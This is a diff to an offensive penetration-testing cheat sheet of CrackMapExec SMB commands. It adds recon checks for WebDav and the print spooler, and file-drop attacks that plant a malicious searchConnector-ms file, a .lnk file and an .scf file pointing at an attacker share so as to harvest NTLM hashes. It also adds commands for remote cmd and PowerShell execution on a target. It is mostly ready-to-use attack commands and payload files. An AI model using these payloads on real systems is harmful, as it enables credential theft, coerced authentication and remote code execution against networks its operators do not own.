@@ -247,6 +247,74 @@ cme smb <ip> -u <user> -p <password> -M PetitPotam
 ## find runing WebDav clients (coerce over http)
 #plateform/linux #target/remote #port/445 #protocol/smb #cat/RECON 
 try to force WebDav to start  with -M drop-sc
-```
+```bash
 cme smb <ip_range> -u <user> -p <passwd> -M webdav
+```
+
+## Checking if the service spooler is running
+#plateform/linux #target/remote #port/445 #protocol/smb #cat/RECON 
+```bash
+cme smb <ip_range> -u <user> -p <passwd> -M spooler
+```
+
+## drop malicious ..searchConnector-ms file  (enable WebDav)
+#plateform/linux #target/remote #port/445 #protocol/smb #cat/ATTACK/COERCE-FILE
+in every writable folder on the target server 
+	
+
+<?xml version="1.0" encoding="UTF-8"?>
+<searchConnectorDescription
+xmlns="http://schemas.microsoft.com/windows/2009/searchConnector">
+<description>Microsoft Outlook</description>
+<isSearchOnlyItem>false</isSearchOnlyItem>
+<includeInStartMenuScope>true</includeInStartMenuScope>
+<templateInfo>
+<folderType>{91475FE5-586B-4EBA-8D75-D17434B8CDF6}</folderType>
+</templateInfo>
+<simpleLocation>
+<url>https://whatever/</url>
+</simpleLocation>
+</searchConnectorDescription>
+
+```bash
+cme smb <ip_range> -u <user> -p <passwd> -M drop-sc 
+```
+
+## drop an malicious .lnk file (hash farming)
+#plateform/linux #target/remote #port/445 #protocol/smb #cat/ATTACK/COERCE-FILE
+in every writable folder on the target server 
+CLEANUP=true
+
+```bash
+cme smb <ip> -u <user> -p <password> -M slinky -o NAME=<file_name> SERVER=<local_ip>
+```
+ 
+
+## drop an malicious .scf file (hash farming)
+#plateform/linux #target/remote #port/445 #protocol/smb #cat/ATTACK/COERCE-FILE
+in every writable folder on the target server 
+CLEANUP=true
+
+[Shell]
+Command=2
+IconFile=\\X.X.X.X\share\pentestlab.ico
+[Taskbar]
+Command=ToggleDesktop
+
+```bash
+cme smb <ip> -u <user> -p <password> -M scufy -o NAME=<file_name> SERVER=<local_ip>
+```
+ 
+## execute command (cmd)
+#plateform/linux #target/remote #port/445 #port/139 #protocol/smb #warning/modify_target #cat/POSTEXPLOIT
+
+```bash
+cme smb <ip> -u <user> -p '<password>' -x '<command>' --no-output
+```
+ 
+## execute command (powershell)
+#plateform/linux #target/remote #port/445 #port/139 #protocol/smb #warning/modify_target #cat/POSTEXPLOIT
+
+```bash
+cme smb <ip> -u <user> -p '<password>' -X '<command>' --no-output
 ```
